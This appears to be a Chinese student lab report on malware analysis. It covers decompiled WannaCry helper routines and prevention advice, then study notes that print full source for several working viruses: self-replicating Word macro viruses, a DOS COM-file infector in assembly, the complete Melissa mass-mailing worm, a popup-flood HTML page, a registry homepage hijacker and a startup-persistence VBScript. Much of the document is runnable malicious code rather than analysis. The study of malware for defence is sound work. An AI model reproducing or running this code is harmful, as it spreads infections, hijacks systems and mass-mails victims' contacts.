## 7.1 DeleteFile 删除回收站和临时目录下的.WNCRY文件

```
int __cdecl DeleteFile(int a1)  

{  



GetRecyclePathOrTempPath(a1, &RecyclePath);   

// 获取回收站路径或者C盘下的临时文件夹路径  

swprintf(&String, (size_t)aSS, &RecyclePath, aWncryt);

// string=回收站路径或临时文件夹路径+*.WNCRYT   

//   

hFile = FindFirstFileW(&String, &FindFileData);//在回收站查找所有.WNCRYT结尾的文件  

if ( hFile == (HANDLE)-1 )                    // 如果没找到直接返回  

{  

v2 = (char *)Memory;  

v24 = -1;  

if ( Memory != v17 )  

{  

do  

{  

std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::~basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>(  

v2,  

0);  

v2 += 16;  

}  

while ( v2 != v17 );  

v2 = (char *)Memory;  

}  

FreeMem(v2);                                // 释放内存  

result = 0;  

}  

else  

{  

do                                          // 如果找到了  

{  

swprintf(&String, (size_t)aSS_0, &RecyclePath, FindFileData.cFileName);// 拼接目标文件的完整路径  

v19 = v13;                                // 清空strings对象的内存  

std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Tidy(&v19, 0);  

TargetFullPathLen = wcslen(&String);      // 获取目标文件完整路径的长度  

if ( (unsigned __int8)std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Grow(  

&v19,  

TargetFullPathLen,  

1) )  

{  

wmemcpy(TargetFullPath, &String, TargetFullPathLen);// 拷贝目标路径  

std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Eos(  

&v19,                                 // 将目标文件路径和长度写入到容器  

TargetFullPathLen);  

}  

LOBYTE(v24) = 1;  

sub_4013D0(&v15, (int)v17, 1u, (int)&v19);// 这个函数会把之前的String对象放到另一个容器里  

LOBYTE(v24) = 0;  

std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Tidy(&v19, 1);  

}  

while ( FindNextFileW(hFile, &FindFileData) );  

FindClose(hFile);                           // 文件遍历结束  

v5 = 0;  

for ( i = 0; ; i += 16 )  

{  

v7 = (char *)Memory;  

if ( !Memory || v5 >= (v17 - (_BYTE *)Memory) >> 4 )  

break;  

TargetFullPath_1 = *(const WCHAR )((char *)Memory + i + 4);  

if ( !TargetFullPath_1 )  

TargetFullPath_1 = (const WCHAR *)`std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Nullstr'::`2'::_C;  

if ( DeleteFileW(TargetFullPath_1) )      // 删除目标文件  

++v14;  

++v5;  

}  

v9 = (char *)Memory;  

v10 = v17;  

v11 = (char *)Memory;  

if ( Memory != v17 )  

{  

do  

{  

std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Tidy(v11, 1);  

v11 += 16;  

}  

while ( v11 != v10 );  

v7 = (char *)Memory;  

}  

v17 = v9;  

v24 = -1;  

v12 = v7;  

if ( v7 != v9 )  

{  

do  

{                                         // 循环清空每一个容器里的内容  

std::basic_string<unsigned short,std::char_traits<unsigned short>,std::allocator<unsigned short>>::_Tidy(v12, 1);  

v12 += 16;  

}  

while ( v12 != v9 );  

v7 = (char *)Memory;  

}  

FreeMem(v7);                                // 释放内存  

result = v14;  

}  

return result;  

}  
```



-   首先，该函数利用了 GetRecyclePathOrTempPah 函数获得了 回收站D:/$RECYCLE 和系统盘历史文件夹的路径C:UsersDingisoAppDataLocalTemp 这两个地址
    
-   然后函数会循环两次，判断是否系统中存在其他的盘符。

-   接着函数利用FindFirstW函数查找目标文件夹中所有的以.WNCRYT结尾的文件

-   函数会将他遍历的所有的.WNCRYT文件的完整路径和长度存储到一个容器中

-   当文件遍历结束 会调用DeleteFileW 删除所有容器中记录的项

-   最后 循环将存放文件的完整路径和长度的容器清空 ，释放资源

# 8 taskse.exe 病毒辅助文件分析 

```c
signed int __cdecl sub_401000(int argv, int a2, __int16 Num_5, int Num_0)  

{  

Advapi32Base = GetModuleHandleA(LibFileName); // 获取advapi32.dll句柄  

if ( !Advapi32Base )  

{  

Advapi32Base = LoadLibraryA(LibFileName);   // 加载advapi32.dll  

*

kernel32Base = GetModuleHandleA(kernel32);  

if ( !kernel32Base )  

{  

kernel32Base = LoadLibraryA(kernel32);      // 加载kernel32.dll  

if ( !kernel32Base )  

return -1;  

}  

hProcess = ((int (__stdcall *)(signed int, void ))GetCurrentProcess_Addr)(40, &TokenHandle);// 获取当前进程的伪句柄  

if ( !((int (__stdcall *)(int))OpenProcessToken_Addr)(hProcess) )// 以修改权限的方式 打开进程的令牌  

goto LABEL_55;  

if ( !((int (__stdcall *)(_DWORD, char *, int *))LookupPrivilegeValueA_Addr)(0, aSetcbprivilege, &lpLuid) )// 获得LUID  

{  

local_unwind2((int)&ms_exc.registration, -1);  

return -1;  

}  

NewState = 1;  

lpLuid_1 = lpLuid;  

v18 = v27;  

v19 = 2;  

if ( !((int (__stdcall *)(void *, _DWORD, int *, signed int, int *, char *))AdjustTokenPrivileges_Addr)(  

TokenHandle,  

0,  

&NewState,  

0x10,  

&PreviousState,  

&ReturnLength) )                      // 提升当前权限  

{  

* 

if ( !((int (__stdcall *)(int, void ))WTSQueryUserToken_Addr)(SessionId, &phToken) )// 获取用户的访问令牌  

{  

local_unwind2((int)&ms_exc.registration, -1);  

return -1;  

}  

if ( !((int (__stdcall *)(void *, signed int, _DWORD, signed int, signed int, void ))DuplicateTokenEx_Addr)(// 创建一个新的访问令牌  
```



该文件的主要作用是提权，主要逻辑如下：

-   获取必要API函数地址

-   提上当前的权限

-   获取当前用户的访问令牌并创建一个新的访问令牌

-   最后再次提升权限

# 9 WannaCry 病毒分析总结 

该病毒涉及的相关文件及作用如下：

-   msg 病毒的语言包

-   c.wnry 存储了比特币账户 一个下载链接 跟勒索相关

-   t.wnry 隐藏了一个dll文件 dll的导出函数是病毒的核心代码

-   u.wnry 解密器

-   r.wrny 勒索文档

-   @WanaDecryptor@.exe 解密器

-   taskse.exe 提权

-   taskdl.exe 删除临时文件和回收站的.WNCRY文件

-   00000000.pky 公钥

-   00000000.eky 被加密的私钥

-   00000000.res 八个字节的随机数和当前时间

-   .bat为解密器创建快捷方式

附上病毒行为的总结图表：

{% asset_img image20.png 20 %}

# 10 病毒预防及杀毒方案：

1.  该病毒利用了永恒之蓝的漏洞，微软官方提供了相应的补丁文件，用户可以通过尽快安全更新的方式防止受到针对此漏洞的病毒的攻击

2.  经过我们分析得知，该病毒的传播主要是利用了 445
    端口发送病毒本体，关闭端口可以防止我们被攻击。

3.  在分析病毒 exe 文件时，病毒加密器在
    加密前会进行互斥体检测。检测是否已经有加密器程序存在，这是创建了互斥体
    MsWinZonesCacheCounterMutexA
    ，安全软件可以预先创建互斥体，这样加密器在加密前就会自动推出，不会进行加密

# 11 学习笔记：

### 微软 宏病毒

病毒主体

```visual basic
' Micro-Virus

Sub Document_Open()

On Error Resume Next

Application. DisplayStatusBar=False '屏蔽状态栏

Options. SaveNormalPrompt=False
'修改公用模板时在后台自动保存，不给任何提示

Ourcode =ThisDocument. VBProject. VBComponents(1). CodeModule.
Lines(1,100)

'获取当前文档代码对象

Set Host =NormalTemplate. VBProject. VBComponents(1). CodeModule

'获取共用模板的代码对象

If ThisDocument =NormalTemplate Then
'判断当前文件是否等于公用模板对象

Set Host=ActiveDocument. VBPro ject. VBComponents(1). CodeModule

'如果是，则获取当前活动文档的代码对象

End If

With Host

If. Lines(1.1)<>"Micro-Virus"Then '判断当前文档是否感染病毒

. Deletelines 1,. CountOfLines '如果不是，就清除原来的代码

. Insertlines 1, Ourcode'嵌入病毒代码

. Replaceline 2,"Sub Document_Close()"'更换

If ThisDocument=nomaltemplate Then '判断当前的文档是否是公用模块

. ReplaceLine 2,"Sub Document_Open()"

ActiveDocument. SaveAs ActiveDocument. FullName

End If

End If

End With

MsgBox "MicroVirus by Content Security Lab"

End Sub
```



### 病毒分析

2.4该代码的基本执行流程如下：
1）进行必要的自我保护。高明的病毒编写者其自我保护将做得非常好，可以使word的一些工具栏失效，例如将工具菜单中的宏选项屏蔽，也可以修改注册表达到很好的隐藏效果。本例中只是屏蔽状态栏，以免显示宏的运行状态，并且修改公用模板时自动保存，不给用户提示。

```visual basic
Application.DisplayStatusBar=False Options.SaveNormalPrompt=False
```

2）得到当前文档的代码对象和公用模板的代码对象。

2）得到当前文档的代码对象和公用模板的代码对象。

```visual basic
Ourcode=ThisDocument.VBProject.VBComponents（1）.CodeModule.Lines（1，100）

Set Host=NormalTemplate.VBPro ject.VBComponents（1）.CodeModule

If ThisDocument =NormalTemplate Then

Set Host=ActiveDocument.VBProject.VBComponents（1）.CodeModule

End If
```

3）检查模板是否已经感染病毒，如果没有，则复制宏病毒代码到模板，并且修改函数名。

```visual basic
With Host

If.Lines（1.1）<）""Micro-Virus"Then

.Deletelines 1，.CountOfLines

.InsertLines 1，Ourcode

.ReplaceLine 2，"Sub Document_Close（）"

If ThisDocument=nomaltemplate Then

.ReplaceLine 2，"Sub Document_open（）"

ActiveDocument.SaveAs ActiveDocument.Ful1Name

End If

End If

End With
```

4）执行恶意代码。

```visual basic
MsgBox"MicroVirus by Content Security Lab"
```

2.5此时当前word文档就含有宏病毒，只要下次打开这个word文档，就会执行以上代码，并将自身复制到Normal.dot（word文档的公共模板）和当前文档的ThisDocument中，同时改变函数名（模板中为Document*Close，当前文档为Document*Open），此时所有的word文档打开和关闭时，都将运行以上的病毒代码，可以加入适当的恶意代码，影响word的正常使用，本例中只是简单的跳出一个提示框。将当前文档关闭再重新打开，弹出一个提示框，且屏蔽了状态栏

### 宏病毒分析2

找到一个类似于给出病毒的实现并进行分析

```visual basic
'moonlight

Dim nm(4)

Sub Smallboy_Virus()

'屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板

On Error Resume Next

Application.DisplayStatusBar = False

'屏蔽状态栏

Options.SaveNormalPrompt = False

'修改公用模板时在后台自动保存，不给任何提示

Ourcode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,
100)

'获取当前文档代码对象

Set host = NormalTemplate.VBProject.VBComponents(1).CodeModule

'获取共用模板的代码对象

'

'获取当前文档对象代码和共用模板对象代码

If ThisDocument = NormalTemplate Then

'判断当前文件是否等于公用模板对象

Set host = ActiveDocument.VBProject.VBComponents(1).CodeModule

'如果是，则获取当前活动文档的代码对象

End If

'

'设立检查当前文档是否被感染，如果没有就自动执行复制宏病毒到模板并修改函数名操作

With host

If .Lines(1.1) <> "Smallboy_Virus()" Then

'判断当前文档是否感染病毒

.deletelines 1, .countoflines

'如果不是，就清除原来的代码

.insertlines 1, .OurcodeLines

'嵌入病毒代码

.replaceline 2, "Sub Smallboy_Virus()"

'更换 Smallboy_Virus

If ThisDocument = NormalTemplate Then

'判断当前的文档是否等于公用模块

.replaceline 2, "Sub Smallboy_Virus()"

'如果是，则替换为 Smallboy_Virus

ActiveDocument.SaveAs ActiveDpcument.FullName

'保存文档，并修改函数名（）

End If

End If

End With

'*弹出第一个框*

MsgBox "！！！"

'*定义算数数据成员*

Count = 0 '定义count=0

try: '执行try语句

On Error GoTo 0

On Error GoTo try

test = -1 '初始化并定义text=-1

con = 1 '初始化并定义con=1

tog$ = "" '初始化tog$

i = 0 '初始化并定义i=0

'开始执行算术数据成员的行循环语句

While test = -1

'因为之前已经定义了test=-1，所以肯定会先执行一次while循环

For i = 0 To 4

'执行一个for循环

nm(i) = Int(Rnd() * 100)

'将rnd（）*100的正整数结果赋值给数组nm（i）

con = con * nm(i)

'将con*nm(i)的值传回给con

If i = 4 Then

'如果i=4,也就是for循环结束之后，开始执行if下的语句

tog$ = tog$ + Str$(nm(4)) + "=?"

'将tog$和Str$( nm(4))+字符串"=？"的值都传给tog$

GoTo beg '执行beg语句

End If '上一个if判断语句执行结束

tog$ = tog$ + Str$(nm(i)) + "*"

'将tog$和Str$( nm(4))+字符串"*"的值都传给tog$

Next i '返回for循环

beg:

'显示第二个对话框，进行答题判断

Beep

ans$ = InputBox("今天是" + Date$ + "，我们玩个心算游戏可好？" +
Chr$(13) + "如果你答错了，

我将代表月亮消灭你！" + Chr$(13) + tog$, "Smallboy")

'显示心算题，和输入心算结果

'*输入运算结果后将要执行的语句'

If RTrim$(LTrim$(ans$)) = LTrim$(Str$(con)) Then

'判断ans$与con是否相等，这是是主要的if判断语句，是下面进行操作的主要依据

'输入答案正确后将要执行的语句'*

MsgBox "恭喜你答对了！！！"

'设置文本格式，字体

'Documents.Add

Selection.Paragraphs.Alignment = wdAlignParagraphCenter

' 设置居中对齐

Beep

With Selection.Font

'设置文本字体

.Name = "黑体"

'设置文本字体为黑体

.Size = 16

'设置文本字体大小为16

.Bold = 1

'设置文本字体为粗体

.Underline = 1

'设置文本字体为下划线

.Color = wdColorRose

'设置文本字体问玫瑰红色

End With

Selection.InsertAfter Text = "什么是宏病毒？" '嵌入文本

Selection.InsertParagraphAfter '换行

Beep

Selection.InsertAfter Text:="答案：" '嵌入文本

Selection.Font.Italic = 1 '设置文本字体为斜体

Selection.InsertAfter Text:="我就是" '嵌入文本

Selection.InsertParagraphAfter '换行

Selection.InsertParagraphAfter '换行

Selection.Font.Italic = 0 '撤销文本为斜体

Beep

Selection.InsertAfter Text:="如何防御宏病毒" '嵌入文本

Selection.InsertParagraphAfter '换行

Selection.InsertParagraphAfter '换行

Beep

Selection.InsertAfter Text:="答案：" '嵌入文本

Selection.Font.Italic = 1 '设置文本字体为斜体

Selection.InsertAfter Text:="别看我" '嵌入文本

MsgBox "按确定键，我将告诉你一个秘密......", "好吧，告诉你吧！"

GoTo out '退出goto语句

'输入答案不正确后将要执行的语句

Else '执行else语句，也就是回答错误后将要执行的

Count = Count + 1 'count++，本来count初始化为0

For j = 1 To 20 '执行循环语句，循环20次

Beep

Documents.Add '增加一个现在这个文档

Next j

Selection.Paragraphs.Alignment = wdAlignParagraphCenter

'设置文本格式为居中对齐

Selection.InsertAfter Text:="宏病毒" '嵌入一个文本

If Count = 2 Then GoTo out

'判断是否执行打开该文本操作够2个20次，如果够了就退出goto语句

GoTo try

WordBasic.filedefault '退出WordBasic文本

End If

Wend '结束with语句

out: '退出

End Sub '退出Sub
```

学习了宏病毒的结构 和 去除宏病毒的方法

结构

-   屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板

-   判断是否是 公用模板 ，否则复制到共用模板

-   通过首行内容判断是否感染病毒

-   执行病毒主体

利用多开窗口等方式耗尽系统资源以影响使用

## COM病毒实验

1) COM文件的特点

COM文件是DOS的一种二进制代码的可执行文件，COM文件结构比较简单，加载过程十分迅速。整个程序只有一个段。因此全部代码长度必须小于64K，其入口代码地址是CS:100H。DOS装入COM文件时，先在内存建立一个长度为100H的程序前缀段(PSP，由DOS建立，是DOS用户程序和命令行之间的接口)，然后将整个文件装载于PSP上端，不进行重定位操作，接着将四个段地址寄存器DS(Data
Segment)，CS(Code Segment)，SS(Stack Segment)，ES(Extra Segment)初始化为程序前缀段(PSP)的段地址，最后将程序的控制权交于CS:100H处。如表一所示：

{% asset_img image21.png 21 %}

表1：COM病毒的装入和执行

2) 病毒原理

COM病毒感染一般有两种途径，一种是将自身代码附加到宿主程序之前，病毒执行完后恢复寄生程序原先的状态，并用JMP
FAR等指令使程序再次回到CS:100H处，以确保寄生程序与PSP的一致。但更为常见的病毒为采用保存文件头若干字节，并将第一条指令改为"JMP
病毒入口"，以确保病毒最先执行。病毒执行完后，会恢复并运行原文件，以便传播，当其将原文件参数全部恢复后，会将控制权交于CS:100H处。

#### 带感染的COM文件

```assembly
proqram seqment

assume cs:program,ds:program,ss:program,es:program

org 0100h # 置程序的初值为100h，开始程序的运行
MOV AX, SEG MESSAGE # 将 message 段地址赋给AX寄存器
MOV DS, AX #
MOV DX, offset message #将偏移量赋给 DX
MOV AH, 09h #打印字符串
INT 21h
MOV AH, 4Ch # 终止程序 返回 DOS
INT 21h
RET

message db"This a simple com program for a test ???",0dh,0ah,"$"

program ends

END
```

病毒的ASM文件

```assembly
CSEG SEGMENT

ASSUME CS:CSEG,DS:CSEG,SS:CSEG

main PROC NEAR

mainstart:

CALL vstart ;病毒代码开始处

vstart:

POP SI #得到当前地址
MOV BP,SI #保存当前地址
PUSH SI
MOV AH,9
ADD SI,OFFSET message-OFFSET vstart #显示预设字符串
MOV DX,SI
INT 21h
POP SI
ADD SI,OFFSET yuan4byte-OFFSET vstart #取得原程序前四个字节
MOV DI,100h #目的地址
MOV AX,DS:[SI] #开始复制
MOV DS:[DI],AX
INC SI
INC SI
INC DI
INC DI
MOV AX,DS:[SI]
MOV DS:[DI],AX
MOV SI,BP #恢复地址值
MOV DX,OFFSET delname-OFFSET vstart #得到删除文件名
ADD DX,SI
MOV AH,41h
INT 21h
MOV DX,OFFSET filename-OFFSET vstart#得到要感染文件名
ADD DX,SI
MOV AL,02
MOV AH,3dhF#写文件
INT 21h

JC error
MOV BX,AX#文件句柄
MOV DX,OFFSET yuan4byte-OFFSET vstart#读文件前四个字节
ADD DX,SI
MOV CX,4
MOV AH,3fh
INT 21h
MOV AX,4202h#到文件尾
XOR CX,CX
XOR DX,DX
INT 21h
MOV DI,OFFSET new4byte-OFFSET vstart#保存要跳的地方
ADD DI,2
ADD DI,SI
SUB AX,4
MOV DS:[DI],AX
ADD SI,OFFSET mainstart-OFFSET vstart#准备写入病毒
MOV DX,SI
MOV vsizes,OFFSET vends-OFFSET mainstart
MOV CX,vsizes
MOV AH,40h
INT 21h
MOV SI,BP#定位到文件头
MOV AL,0
XOR CX,CX
XOR DX,DX
MOV AH,42h
INT 21h
MOV AH,40h#将新的文件头写入
MOV CX,4
MOV DX,OFFSET new4byte-OFFSET vstart
ADD DX,SI
INT 21h
MOV AH,3eh#关闭文件
INT 21h

error:

MOV AX,100h
PUSH AX
RET

main ENDP

yuan4byte:

RET ; ??

DB 3 DUP (?)

vsizes DW 0

new4byte DB 'M',0e9h,0,0

filename DB "test.com",0

delname DB "del.txt",0

message DB "You are infected by a simple com virus~~"

DB 0dh,0ah,"$"

vends:

start:

MOV AX,CSEG
MOV DS,AX
MOV SS,AX
CALL main
MOV AX,4c00h
INT 21h
CSEG ENDS
END start
```

分析的有趣的点

1.  DOS下com文件的加载时一对一的映射的，没有PE结构那样的MZ头和PE头

2.  COM文件加载代码的基址是100H，0~100H是PSP结构，COM文件只有一个段，所以DS，ES......段寄存器都指向PSP

3.  COM文件没有堆栈段，用debug调试发现，sp：FFFE，bp：0000，bp寄存器经过测试可以用来存储其他的值对运行没有影响

4.  病毒代码使用call pop组合拿到pop处代码的绝对地址，以实现重定位

5.  通过对被感染文件的前4字节填充为 sub bp， jmp
    shellcode实现shellcode跳转，进入shellcode首先恢复前4字节，然后执行完流程后通过push
    100H,ret返回原程序

6.  在这里M除了躲避杀毒软件的查杀我没想到其他作用，删掉不影响运行（但是首地址的jmp的目标地址需要对应的修改）

7.  yuan4byte中ret的作用：让病毒程序返回Main函数，成功运行完整个流程

8.  为什么要SUB
    AX,4：类似于inline-hook，jmp相对地址，需要减去jmp语句所在的偏移地址再-jmp本身的长度

## 梅丽莎病毒实验

代码

```visual basic
Sub autoOpen()

On Error Resume Next

'*
修改注册表，循环发送邮件程序部分

If System.PrivateProfileString(""
,"HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity",
"Level") <> "" Then '注册表项判断

CommandBars("Macro").Controls("Security...").Enabled = False

'宏工具栏安全选项失效

System.PrivateProfileString("",
"HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity",
"Level") = 1&

Else

CommandBars("Tools").Controls("Macro").Enabled = False

'工具菜单栏宏选项失效

Options.ConfirmConversions = (1-1): '文件转换对话框不显示

Options.VirusProtection = (1-1): '宏警告对话框不显示

Options.SaveNormalPrompt = (1-1) 'Normal.dot被修改后不显示对话框

End If

Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice

Set UngaDasOutlook = CreateObject("Outlook.Application")

'创建outlook应用程序实例对象

Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")

'获取MAPI对象

If System.PrivateProfileString("",
"HKEY_CURRENT_USERSoftwareMicrosoftOffice", "Melissa")
<> "... by Kwyjibo" Then

If UngaDasOutlook = "Outlook" Then

DasMapiName.Logon "profile", "password"

For y = 1 To DasMapiName.AddressLists.Count

'遍历地址簿，进行邮件发送操作

Set AddyBook = DasMapiName.AddressLists(y)

x = 1

Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)

For oo = 1 To AddyBook.AddressEntries.Count

Peep = AddyBook.AddressEntries(x)

'获取第 x 个收件人的收件地址

BreakUmOffASlice.Recipients.Add Peep

'加入收件人的地址

x = x + 1

If x > 50 Then oo = AddyBook.AddressEntries.Count

Next oo

BreakUmOffASlice.Subject= "Important Message From " &
Application.UserName '设置邮件的主题

BreakUmOffASlice.Body = "Here is that document you asked for ...
don't show anyone else ;-)" '设置邮件的内容

BreakUmOffASlice.Attachments.Add ActiveDocument.FullName '加入附件

BreakUmOffASlice.Send '发送邮件

Peep = ""

Next y

DasMapiName.Logoff '断开连接

End If

System.PrivateProfileString("","HKEY_CURRENT_USERSoftwareMicrosoftOffice",
"Melissa?") = "... by Kwyjibo" ' 设置感染标志

End If

'*First
Part

Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)

'获取当前文档VBA工程第一个模块的名称

Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)

'获取Normal.dot VBA工程第一个模块的名称

NTCL = NTI1.CodeModule.CountOfLines

ADCL = ADI1.CodeModule.CountOfLines

BGN = 2

If ADI1.Name <> "Melissa" Then '如果当前文档为感染

If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL

Set ToInfect = ADI1

ADI1.Name = "Melissa"

DoAD = True

End If

If NTI1.Name <> "Melissa" Then'如果 Normal.dot 未感染

If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL

Set ToInfect = NTI1

NTI1.Name = "Melissa" '修改VBA工程第一个模块为 Mellisa

DoNT = True

End If

If DoNT <> True And DoAD <> True Then GoTo CYA

'开始感染 Normal.dot

If DoNT = True Then

Do While ADI1.CodeModule.Lines(1, 1) = ""

ADI1.CodeModule.DeleteLines 1

Loop

ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")

Do While ADI1.CodeModule.Lines(BGN, 1) <> ""

ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)

BGN = BGN + 1

Loop

End If

If DoAD = True Then '开始感染当前文档

Do While NTI1.CodeModule.Lines(1, 1) = ""

NTI1.CodeModule.DeleteLines 1

Loop

ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")

Do While NTI1.CodeModule.Lines(BGN, 1) <> ""

ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)

BGN = BGN + 1

Loop

End If

CYA:

'保存被修改的当前文档和Normal.dot

If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name,
"Document") = False) Then

ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then

ActiveDocument.Saved = True

End If

'WORD/Melissa written by Kwyjibo

'Works in both Word 2000 and Word 97

'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!

'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!

If Day(Now) = Minute(Now) Then

Selection.TypeText " Twenty-two points, plus triple-word-score, plus
fifty points for using all my letters. Game's over. I'm outta
here."

End Sub
```



1.  修改注册表

2.  发送邮件

## HTML病毒

#### 无限跳窗口病毒

 ```javascript
<body>

<A href="" onmouseover="while(true){window.open()}">恶意弹出窗口！</A>
 
</body>
 ```


将此病毒运行在现实中的 chrome 浏览器上，系统提示
阻止弹出窗口，表明现行的浏览器已经对这种病毒进行了防护

#### 更改主页病毒

通过 VbScript 嵌入 html 的 script 标签， 嵌入一段vb代码

```html
<html>

<META http-equiv=Content-Type content="text/html:charset=gb2312">

<HEAD>

<SCRIPT language="vbscript">

Sub main()

Dim TheForm

Set TheForm=Document.forms（"myform"）

strKey="HKEY_CURRENT_USERSoftwarellicrosoftInternetExplorerMain"

strValue="Start Page"

strData="http://www.simpleware.com.cn"

strType ="REG_SZ"

regAdd strKey，strValue，strData，strType

End Sub

<!--上方 main script主体，调用regAdd 函数 进行注册表项的更改-->

function regAdd（strKey，strValue，strData，strType）

Dim Wshshell

Set WshShell=CreateObject（"WScript.Shell"）

WshShell.RegWrite strKey & "" & strValue,strData,strType

<!通过 shell 文件进行注册表项的改写>

msgbox（"Successful"）

<!改写成功后 显示 successful>

end function

</SCRIPT>
    </HEAD>
<body onload="main()">
修改主页
</body>
</html>
```

{% asset_img image22.jpeg 22 %}

注册表修改成功

五、防治方法：
5.1要避免被网页恶意代码感染，首先关键是不要轻易去一些并不信任的站点。
5.2IE点击"工具-->Internet选项-->安全-->Internet区域的安全级别"，把安全级别由"中"改为"高"。
5.3具体方案是：在IE窗口中点击"工具--->Internet选项"，在弹出的对话框中选择"安全"标签，再点击"自定义级别"按钮，就会弹出"安全设置"对话框，把其中所有Acti
veX插件和控件以及与Java相关全部选项选择"禁用"。
5.4一定要在计算机上安装防火墙，并要时刻打开"实时监控功能"。
5.5在注册表的KEY*CURRENT*USERSoftwareMicrosoftWindwsCurrentVersionPoliciesSystem下，增加名为DisableRegistryTools的DWORD值项，将其值改为"1"，即可禁止使用注册表编辑器命令regedit.exe。
5.6因为特殊原因需要修改注册表，可应用如下解锁方法：开始因为特殊原因需要修改注册表，可应用如下解锁方法：运行--->gpedit.msc打开组策略左面分级展开用户配置--->管理模板----->系统右面有个阻止访问注册表编辑工具设置成已禁用确定即可。
5.7随时升级IE浏览器的补丁。
【实验思考】
1.可根据"几个相关修改"中提到的注册表中值，利用"更改主页"中修改注册表的方法，来进行自己的注册表修改，并给出如何防范和修复。

## 脚本病毒

自动拷贝到开始菜单启动栏项

> On Error Resume Next'启动或关闭一个错误处理常式
>
> Set
> fs=CreateObject("Scripting.FileSystemobject")'创建并返回一个对Activex对象的引用
>
> Set diro=fs.GetSpecialFolder(0)'取系统路径C:windows
>
> dirl=Mid(dir0,1,InStr(dir0,":"))'取系统盘符
>
> Set so=CreateObject（"Scripting.FileSystemObject"）
>
> dim r'定义变量
>
> Set r=Create0bject("Wscript.Shel1")'创建并返回一个对
> Activex对象的引用
>
> so.GetFile(WScript.ScriptFullName).Copy(dirl&"Documents and
> SettingsAdministrator[开始]菜单程序启动Win32system.vbs")
>
> '拷贝文件

## 病毒分析

文件监控

学会了Process Monitor 的使用，这个软件现在仍然活跃在今日的舞台

1.8注意，不要把explorer.exe和iexplore.exe这两个进程过滤掉，因为病毒经常要注入代码到这两个进程中完成特别的功能。如果过滤掉这两个进程，那么就无法监控到被注入到这两个进程的代码所进行的文件操作。

注册表监控 ： 根据 operation 过滤项，查看 RegSetValue
即更改了注册表项的进程

进程监控二 ： 学会使用 Process Explorer

网络监控：利用 TcpView 工具进行 端口，进程的网络连接监控，netspy
进行侵入并打开7306端口等待 netmonitor 的监控，可以查看计算机中的文件

全面监控： 利用 InCtrl5 对安装程序的安装过程进行文件，注册表项，INI，TXT
文件的全面跟踪，从而实现对安装过程的全面了解，并生成一份报告，供查阅

# 致 谢


感谢老师 和 学长的帮助和指导

